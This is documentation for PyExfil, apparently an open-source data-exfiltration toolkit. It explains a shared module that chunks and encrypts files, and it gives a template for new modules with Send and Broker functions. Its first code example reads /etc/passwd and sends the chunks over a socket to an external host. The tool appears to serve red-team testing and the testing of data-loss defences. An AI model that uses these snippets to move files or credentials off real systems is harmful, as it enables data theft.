# Documentation | PyExfil

## Shared Abilities
Please notice that although we have tried to keep this a collection of relatively separated stand alone modules so that converting them to static binaries for various operating systems would be as easy as possible, some things we have decided to turn into modules that would be shared across the board while attempting to keep is as depency free as possible. Such a component for now is `pyexfil/includes/prepare`. This module contains the methods of converting files (compressing, encrypting, encoding and splitting) into chunks ready to be sent or decoded.

You can use it in the following way:

```python
import socket
from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket

proc = PrepFile('/etc/passwd', kind='binary') # will yield a dictionary

# Send the data over
sock = socket.socket()
sock.connect(('google.com', 443))
for i in proc['Packets']:
    sock.send(i)
sock.close()

# Rebuilding the data:
conjoint = []
for packet in proc['Packets']:
    b = DecodePacket(packet)
    conjoint.append(b)

# Verify and rebuild the file:
print(RebuildFile(conjoint))
```

## Calling Convention
In theory we wish each module to have a convention call to make it easier to work with. Some methods make it easier while some make it more difficult. For that, here is a template on how we wish for it to be. Please bear in mind some modules will not fall into place. Use your best judgment.

1. Preparing file/data for exfiltration should be done as in [this section]("#shared-abilities").
2. Place the package folder under the right location. For example; short communication (C&C) under `Comm`, exfiltration over network communication under `network` etc.
3. Create an `__init__.py` under that folder.
4. For broadcasting purposes use the function name `Send` that will wrap everything up.
5. For receiving purposes use `Broker` function to contain the function. If possible, set it up in a threading mode as to return back.
6. * if possible add a call back function for when data arrives.

Here's an `__ini__.py` example file:

```python
from scapy.all import *
from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket

def _send_packet(host, port, data, counter):
  open('/dev/null', 'w').write("%s%s" % (data, counter))

def _testCallBack(pkt):
  print("Me got a pkt! [%s]" % len(pkt))

def Send(fname, password, host, port):
  proc = PrepFile(fname, kind='binary', enc_key=password, max_size=1024)
  i = 0
  for p in proc['Packets']:
    _send_packet(host, port, p, i)
    i += 1
  return True

class Broker():
  def __init__(self, key, retFunc=_testCallBack):
    self.key = key
    self.callBack = retFunc

  def _parse(self, pkt):
    if pkt is 'A Good Boy':
      self.callBack(pkt)
    else:
      """ These are not the packets you're looking for """
      pass

  def Listen(self):
    while True:
      sniff(ptn=self._parse, filter='stam', store=0, count=0)
```

There are also a few "ready made functions" that we found useful on several scenarios that can be found in the `general.py`, `image_manipulation.py` and `encryption_wrappers.py`. Have a look at them before reimplementing some of these.

## Exceptions

`PyExfil` holds ability to raise custom exceptions. These exceptions appear in `pyexfil/includes/exceptions.py`
